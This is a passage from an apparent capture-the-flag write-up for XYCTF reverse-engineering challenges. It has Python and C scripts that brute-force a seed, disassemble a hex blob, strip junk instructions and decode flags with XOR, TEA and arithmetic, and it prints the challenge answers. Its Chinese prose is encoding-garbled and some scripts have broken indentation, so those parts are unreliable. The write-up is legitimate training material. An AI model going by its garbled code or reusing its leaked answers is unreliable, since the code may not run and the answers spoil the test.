class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (containsXYCTF(flag))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;seed = %d\n&quot;</span>, seed);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// seed = 21308</span></span><br><span class="line"><span class="comment">// XYCTF&#123;R@nd_1s_S0_S0_S0_easy!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="8-ä½•é¡»ç›¸æ€ç…®ä½™å¹´"><a href="#8-ä½•é¡»ç›¸æ€ç…®ä½™å¹´" class="headerlink" title="8.ä½•é¡»ç›¸æ€ç…®ä½™å¹´"></a>8.ä½•é¡»ç›¸æ€ç…®ä½™å¹´</h2><h5 id="è½¬æ±‡ç¼–ï¼Œå»èŠ±æŒ‡ä»¤"><a href="#è½¬æ±‡ç¼–ï¼Œå»èŠ±æŒ‡ä»¤" class="headerlink" title="è½¬æ±‡ç¼–ï¼Œå»èŠ±æŒ‡ä»¤"></a>è½¬æ±‡ç¼–ï¼Œå»èŠ±æŒ‡ä»¤</h5><p>ä¸€å †åå…­è¿›åˆ¶åº”è¯¥æ˜¯è¦è½¬æ±‡ç¼–</p><p>æœçš„è„šæœ¬è½¬äºŒè¿›åˆ¶ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hex_data = <span class="string">&quot;0x55 0x8b 0xec 0x81 0xec 0xa8 0x0 0x0 0x0 0xa1 0x0 0x40 0x41 0x0</span></span><br><span class="line"><span class="string">0x33 0xc5 0x89 0x45 0xfc 0x68 0x9c 0x0 0x0 0x0 0x6a 0x0 0x8d 0x85 0x60 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x50 0xe8 0x7a 0xc 0x0 0x0 0x83 0xc4 0xc 0xc7 0x85 0x58 0xff 0xff 0xff 0x27</span></span><br><span class="line"><span class="string">0x0 0x0 0x0 0xc7 0x85 0x5c 0xff 0xff 0xff 0x0 0x0 0x0 0x0 0xeb 0xf 0x8b 0x8d 0x5c</span></span><br><span class="line"><span class="string">0xff 0xff 0xff 0x83 0xc1 0x1 0x89 0x8d 0x5c 0xff 0xff 0xff 0x83 0xbd 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x27 0xf 0x8d 0xed 0x0 0x0 0x0 0x8b 0x95 0x5c 0xff 0xff 0xff 0x81 0xe2</span></span><br><span class="line"><span class="string">0x3 0x0 0x0 0x80 0x79 0x5 0x4a 0x83 0xca 0xfc 0x42 0x85 0xd2 0x75 0x25 0x8b 0x85</span></span><br><span class="line"><span class="string">0x5c 0xff 0xff 0xff 0x8b 0x8c 0x85 0x60 0xff 0xff 0xff 0x3 0x8d 0x5c 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x8b 0x95 0x5c 0xff 0xff 0xff 0x89 0x8c 0x95 0x60 0xff 0xff 0xff 0xe9 0xac</span></span><br><span class="line"><span class="string">0x0 0x0 0x0 0x8b 0x85 0x5c 0xff 0xff 0xff 0x25 0x3 0x0 0x0 0x80 0x79 0x5 0x48</span></span><br><span class="line"><span class="string">0x83 0xc8 0xfc 0x40 0x83 0xf8 0x1 0x75 0x22 0x8b 0x8d 0x5c 0xff 0xff 0xff 0x8b</span></span><br><span class="line"><span class="string">0x94 0x8d 0x60 0xff 0xff 0xff 0x2b 0x95 0x5c 0xff 0xff 0xff 0x8b 0x85 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x89 0x94 0x85 0x60 0xff 0xff 0xff 0xeb 0x73 0x8b 0x8d 0x5c 0xff 0xff</span></span><br><span class="line"><span class="string">0xff 0x81 0xe1 0x3 0x0 0x0 0x80 0x79 0x5 0x49 0x83 0xc9 0xfc 0x41 0x83 0xf9 0x2</span></span><br><span class="line"><span class="string">0x75 0x23 0x8b 0x95 0x5c 0xff 0xff 0xff 0x8b 0x84 0x95 0x60 0xff 0xff 0xff 0xf</span></span><br><span class="line"><span class="string">0xaf 0x85 0x5c 0xff 0xff 0xff 0x8b 0x8d 0x5c 0xff 0xff 0xff 0x89 0x84 0x8d 0x60</span></span><br><span class="line"><span class="string">0xff 0xff 0xff 0xeb 0x38 0x8b 0x95 0x5c 0xff 0xff 0xff 0x81 0xe2 0x3 0x0 0x0 0x80</span></span><br><span class="line"><span class="string">0x79 0x5 0x4a 0x83 0xca 0xfc 0x42 0x83 0xfa 0x3 0x75 0x20 0x8b 0x85 0x5c 0xff</span></span><br><span class="line"><span class="string">0xff 0xff 0x8b 0x8c 0x85 0x60 0xff 0xff 0xff 0x33 0x8d 0x5c 0xff 0xff 0xff 0x8b</span></span><br><span class="line"><span class="string">0x95 0x5c 0xff 0xff 0xff 0x89 0x8c 0x95 0x60 0xff 0xff 0xff 0xe9 0xf7 0xfe 0xff</span></span><br><span class="line"><span class="string">0xff 0x33 0xc0 0x8b 0x4d 0xfc 0x33 0xcd 0xe8 0x4 0x0 0x0 0x0 0x8b 0xe5 0x5d</span></span><br><span class="line"><span class="string">0xc3&quot;</span></span><br><span class="line"><span class="comment"># å»é™¤ç©ºæ ¼å¹¶å°†åå…­è¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²åˆ†å‰²æˆåå…­è¿›åˆ¶å€¼çš„åˆ—è¡¨</span></span><br><span class="line">hex_values = hex_data.split()</span><br><span class="line"><span class="comment"># å°†æ¯ä¸ªåå…­è¿›åˆ¶å€¼è½¬æ¢ä¸ºç›¸åº”çš„æ•´æ•°å€¼</span></span><br><span class="line">int_values = [<span class="built_in">int</span>(value, <span class="number">16</span>) <span class="keyword">for</span> value <span class="keyword">in</span> hex_values]</span><br><span class="line"><span class="comment"># å°†æ•´æ•°å€¼åˆ—è¡¨è½¬æ¢ä¸ºå­—èŠ‚</span></span><br><span class="line">binary_data = <span class="built_in">bytes</span>(int_values)</span><br><span class="line"><span class="comment"># å°†äºŒè¿›åˆ¶æ•°æ®å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(binary_data)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">code =</span><br><span class="line"><span class="string">b&#x27;\x55\x8b\xec\x81\xec\xa8\x00\x00\x00\xa1\x00\x40\x41\x00\x33\xc5\x89\x</span></span><br><span class="line"><span class="string">45\xfc\x68\x9c\x00\x00\x00\x6a\x00\x8d\x85\x60\xff\xff\xff\x50\xe8\x7a\x</span></span><br><span class="line"><span class="string">0c\x00\x00\x83\xc4\x0c\xc7\x85\x58\xff\xff\xff\x27\x00\x00\x00\xc7\x85\x</span></span><br><span class="line"><span class="string">5c\xff\xff\xff\x00\x00\x00\x00\xeb\x0f\x8b\x8d\x5c\xff\xff\xff\x83\xc1\x</span></span><br><span class="line"><span class="string">01\x89\x8d\x5c\xff\xff\xff\x83\xbd\x5c\xff\xff\xff\x27\x0f\x8d\xed\x00\x</span></span><br><span class="line"><span class="string">00\x00\x8b\x95\x5c\xff\xff\xff\x81\xe2\x03\x00\x00\x80\x79\x05\x4a\x83\x</span></span><br><span class="line"><span class="string">ca\xfc\x42\x85\xd2\x75\x25\x8b\x85\x5c\xff\xff\xff\x8b\x8c\x85\x60\xff\x</span></span><br><span class="line"><span class="string">ff\xff\x03\x8d\x5c\xff\xff\xff\x8b\x95\x5c\xff\xff\xff\x89\x8c\x95\x60\x</span></span><br><span class="line"><span class="string">ff\xff\xff\xe9\xac\x00\x00\x00\x8b\x85\x5c\xff\xff\xff\x25\x03\x00\x00\x</span></span><br><span class="line"><span class="string">80\x79\x05\x48\x83\xc8\xfc\x40\x83\xf8\x01\x75\x22\x8b\x8d\x5c\xff\xff\x</span></span><br><span class="line"><span class="string">ff\x8b\x94\x8d\x60\xff\xff\xff\x2b\x95\x5c\xff\xff\xff\x8b\x85\x5c\xff\x</span></span><br><span class="line"><span class="string">ff\xff\x89\x94\x85\x60\xff\xff\xff\xeb\x73\x8b\x8d\x5c\xff\xff\xff\x81\x</span></span><br><span class="line"><span class="string">e1\x03\x00\x00\x80\x79\x05\x49\x83\xc9\xfc\x41\x83\xf9\x02\x75\x23\x8b\x</span></span><br><span class="line"><span class="string">95\x5c\xff\xff\xff\x8b\x84\x95\x60\xff\xff\xff\x0f\xaf\x85\x5c\xff\xff\x</span></span><br><span class="line"><span class="string">ff\x8b\x8d\x5c\xff\xff\xff\x89\x84\x8d\x60\xff\xff\xff\xeb\x38\x8b\x95\x</span></span><br><span class="line"><span class="string">5c\xff\xff\xff\x81\xe2\x03\x00\x00\x80\x79\x05\x4a\x83\xca\xfc\x42\x83\x</span></span><br><span class="line"><span class="string">fa\x03\x75\x20\x8b\x85\x5c\xff\xff\xff\x8b\x8c\x85\x60\xff\xff\xff\x33\x</span></span><br><span class="line"><span class="string">8d\x5c\xff\xff\xff\x8b\x95\x5c\xff\xff\xff\x89\x8c\x95\x60\xff\xff\xff\x</span></span><br><span class="line"><span class="string">e9\xf7\xfe\xff\xff\x33\xc0\x8b\x4d\xfc\x33\xcd\xe8\x04\x00\x00\x00\x8b\x</span></span><br><span class="line"><span class="string">e5\x5d\xc3&#x27;</span></span><br><span class="line">assembly = disasm(code)</span><br><span class="line"><span class="built_in">print</span>(assembly)</span><br><span class="line"><span class="comment">#è¿™ä¸ªç›´æ¥è¯»æ±‡ç¼–å‡ºexpï¼Ÿ</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429004853677.png" alt="image-20240429004853677"></p><p>è¿™é‡Œçš„callå’Œä¸‹é¢çš„callçš„åœ°å€ä¸€çœ¼å‡ï¼Œå½“ä½œèŠ±æŒ‡ä»¤nopæ‰</p><p>uã€pæ“ä½œå¤åŸå‡½æ•°</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429005643337.png" alt="image-20240429005643337"><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429005753142.png" alt="image-20240429005753142"></p><p>EXP:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">88</span>, <span class="number">88</span>, <span class="number">134</span>, <span class="number">87</span>, <span class="number">74</span>, <span class="number">118</span>, <span class="number">318</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">92</span>, <span class="number">480</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">41</span>, <span class="number">770</span>, <span class="number">110</span>,</span><br><span class="line"><span class="number">73</span>, <span class="number">31</span>, <span class="number">918</span>, <span class="number">39</span>, <span class="number">120</span>, <span class="number">27</span>, <span class="number">1188</span>, <span class="number">47</span>, <span class="number">77</span>,</span><br><span class="line"><span class="number">24</span>, <span class="number">1352</span>, <span class="number">44</span>, <span class="number">81</span>, <span class="number">23</span>, <span class="number">1680</span>, <span class="number">46</span>, <span class="number">85</span>, <span class="number">15</span>, <span class="number">1870</span>, <span class="number">66</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">4750</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] - i)</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] + i)</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(cipher[i] / i))</span><br><span class="line"><span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] ^ i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="9-ç ¸æ ¸æ¡ƒ"><a href="#9-ç ¸æ ¸æ¡ƒ" class="headerlink" title="9.ç ¸æ ¸æ¡ƒ"></a>9.ç ¸æ ¸æ¡ƒ</h2><h5 id="NsPackå£³å„¿"><a href="#NsPackå£³å„¿" class="headerlink" title="NsPackå£³å„¿"></a>NsPackå£³å„¿</h5><p>[<a href="https://bbs.kanxue.com/thread-115901.htm">åŸåˆ›]NsPack 3.7 æµ…æ ï¼ˆ7.3æ›´æ–°è„±å£³æœºå’Œæºç ï¼‰-åŠ å£³è„±å£³-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>è„±å£³åç®€å•åˆ†æï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">true_cipher = [<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>,</span><br><span class="line"><span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>,<span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>,<span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>,</span><br><span class="line"><span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>,</span><br><span class="line"><span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000048</span>]</span><br><span class="line">XOR = [<span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(true_cipher)):</span><br><span class="line">flag += <span class="built_in">chr</span>(true_cipher[j] ^ XOR[j % <span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="10-ezmath"><a href="#10-ezmath" class="headerlink" title="10.ezmath"></a>10.ezmath</h2><h5 id="exe-py-Z3æ±‚è§£å™¨"><a href="#exe-py-Z3æ±‚è§£å™¨" class="headerlink" title="exe-py-Z3æ±‚è§£å™¨"></a>exe-py-Z3æ±‚è§£å™¨</h5><p>(?è¦ç»å¸¸æ›´æ–°pyexeåº“å•Šã€‚ã€‚)</p><p>å…¶å®è¿™ä¸ªé¢˜è¿˜æ˜¯å¾ˆè€ƒéªŒåˆ†æçš„ï¼Œ</p><p>å¤ªé•¿äº†åˆ†å¼€</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;sum([flag[23] for _ in range(flag[23])]) + sum([flag[12] for _ in range(flag[12])]) + sum([flag[1] for _ in range(flag[1])]) - sum([flag[24] for _ in range(222)]) + sum([flag[22] for _ in range(flag[22])]) + sum([flag[31] for _ in range(flag[31])]) + sum([flag[26] for _ in range(flag[26])]) - sum([flag[9] for _ in range(178)]) - sum([flag[29] for _ in range(232)]) + sum([flag[17] for _ in range(flag[17])]) - sum([flag[23] for _ in range(150)]) - sum([flag[6] for _ in range(226)]) - sum([flag[7] for _ in range(110)]) + sum([flag[19] for _ in range(flag[19])]) + sum([flag[2] for _ in range(flag[2])]) - sum([flag[0] for _ in range(176)]) + sum([flag[10] for _ in range(flag[10])]) - sum([flag[12] for _ in range(198)]) + sum([flag[24] for _ in range(flag[24])]) + sum([flag[9] for _ in range(flag[9])]) - sum([flag[3] for _ in range(168)]) + sum([flag[8] for _ in range(flag[8])]) - sum([flag[2] for _ in range(134)]) + sum([flag[14] for _ in range(flag[14])]) - sum([flag[13] for _ in range(170)]) + sum([flag[4] for _ in range(flag[4])]) - sum([flag[10] for _ in range(142)]) + sum([flag[27] for _ in range(flag[27])]) + sum([flag[15] for _ in range(flag[15])]) - sum([flag[15] for _ in range(224)]) + sum([flag[16] for _ in range(flag[16])]) - sum([flag[11] for _ in range(230)]) - sum([flag[1] for _ in range(178)]) + sum([flag[28] for _ in range(flag[28])]) - sum([flag[5] for _ in range(246)]) - sum([flag[17] for _ in range(168)]) + sum([flag[30] for _ in range(flag[30])]) - sum([flag[21] for _ in range(220)]) - sum([flag[22] for _ in range(212)]) - sum([flag[16] for _ in range(232)]) + sum([flag[25] for _ in range(flag[25])]) - sum([flag[4] for _ in range(140)]) - sum([flag[31] for _ in range(250)]) - sum([flag[28] for _ in range(150)]) + sum([flag[11] for _ in range(flag[11])]) + sum([flag[13] for _ in range(flag[13])]) - sum([flag[14] for _ in range(234)]) + sum([flag[7] for _ in range(flag[7])]) - sum([flag[8] for _ in range(174)]) + sum([flag[3] for _ in range(flag[3])]) - sum([flag[25] for _ in range(242)]) + sum([flag[29] for _ in range(flag[29])]) + sum([flag[5] for _ in range(flag[5])]) - sum([flag[30] for _ in range(142)]) - sum([flag[26] for _ in range(170)]) - sum([flag[19] for _ in range(176)]) + sum([flag[0] for _ in range(flag[0])]) - sum([flag[27] for _ in range(168)]) + sum([flag[20] for _ in range(flag[20])]) - sum([flag[20] for _ in range(212)]) + sum([flag[21] for _ in range(flag[21])]) + sum([flag[6] for _ in range(flag[6])]) + sum([flag[18] for _ in range(flag[18])]) - sum([flag[18] for _ in range(178)])&quot;</span></span><br><span class="line">temp = data.split(<span class="string">&quot; + &quot;</span>)</span><br><span class="line">final = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    final = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> temp:</span><br><span class="line">        t=j.split(<span class="string">&quot; - &quot;</span>)</span><br><span class="line">            final.extend(t)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> final:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">f&quot;flag[<span class="subst">&#123;j&#125;</span>]&quot;</span> <span class="keyword">in</span> k:</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line"> <span class="comment">####</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">176</span>)]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">0</span>])]) </span><br><span class="line"><span class="number">1</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">1</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">178</span>)]) </span><br><span class="line"><span class="number">2</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">2</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">2</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">2</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">134</span>)]) </span><br><span class="line"><span class="number">3</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">168</span>)]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">3</span>])]) </span><br><span class="line"><span class="number">4</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">4</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">4</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">4</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">140</span>)]) </span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429234131401.png" alt="image-20240429234131401"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429234223092.png" alt="image-20240429234223092"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="11-ç»™é˜¿å§¨å€’ä¸€æ¯å¡å¸ƒå¥‡è¯º"><a href="#11-ç»™é˜¿å§¨å€’ä¸€æ¯å¡å¸ƒå¥‡è¯º" class="headerlink" title="11.ç»™é˜¿å§¨å€’ä¸€æ¯å¡å¸ƒå¥‡è¯º"></a><strong>11.ç»™é˜¿å§¨å€’ä¸€æ¯å¡å¸ƒå¥‡è¯º</strong></h2><h5 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="built_in">array</span>[<span class="number">0</span>] = <span class="number">0x9B28ED45</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">sum += <span class="number">0x6E75316C</span>;</span><br><span class="line">data1           dd <span class="number">5F</span>797274h            ; DATA XREF: encrypt+<span class="number">2</span>Aâ†‘r</span><br><span class="line">.data:<span class="number">0000000000403010</span>                                         ; encrypt+<span class="number">33</span>â†‘w ...</span><br><span class="line">.data:<span class="number">0000000000403014</span>                 public data2</span><br><span class="line">.data:<span class="number">0000000000403014</span> ; <span class="type">uint32_t</span> data2</span><br><span class="line">.data:<span class="number">0000000000403014</span> data2           dd <span class="number">64726168</span>h            ; DATA XREF: encrypt+<span class="number">39</span>â†‘r</span><br><span class="line">.data:<span class="number">0000000000403014</span>                                </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> data1 = <span 